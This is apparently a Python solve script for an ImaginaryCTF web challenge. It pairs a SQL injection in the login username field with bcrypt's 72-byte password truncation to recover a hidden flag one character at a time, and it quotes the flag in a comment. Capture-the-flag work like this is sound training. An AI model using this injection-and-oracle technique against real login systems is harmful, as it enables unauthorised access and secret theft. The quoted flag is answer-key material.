import bcrypt
import requests

flag = ""
# ictf{why_are_bcrypt_truncating_my_passwords?!}
url = "http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0=688a35c685a7a654abc80f8e123ad9f0"

while True:
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_!-?{}":
        pad = f"{flag:a>71}"
        hash = bcrypt.hashpw(pad.encode()+char.encode(), bcrypt.gensalt(10))
        data = {"username": "' UNION SELECT 'hit','" +
                hash.decode()+"' -- s", "password": 'a'*(71 - len(flag))}
        r = requests.post(url, data=data)
        if "hit" in r.text:
            flag += char
            print(flag)
            break
